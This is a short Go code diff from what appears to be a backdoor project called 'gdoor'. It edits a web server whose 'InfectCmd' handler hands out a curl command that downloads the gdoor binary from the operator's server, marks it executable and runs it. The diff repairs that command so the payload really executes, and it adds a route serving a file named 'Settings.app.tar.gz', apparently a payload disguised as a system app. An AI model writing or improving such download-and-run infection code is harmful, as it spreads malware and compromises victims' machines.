@@ -16,11 +16,12 @@ func Service(){
 
   r.GET("/", InfectCmd)
   r.StaticFile("/gdoor", "./client")
+  r.StaticFile("/root", "./Settings.app.tar.gz")
 
   go r.Run(config.FServerPort)
 }
 
 func InfectCmd(c *gin.Context){
-  cmd := "curl -s " + config.ServerIP + config.FServerPort + "/gdoor > ./gdoor && chmod +x ./gdoor | ./gdoor"
+  cmd := "curl -s " + config.ServerIP + config.FServerPort + "/gdoor > ./gdoor && chmod +x ./gdoor && ./gdoor"
   c.String(http.StatusOK, cmd)
 }
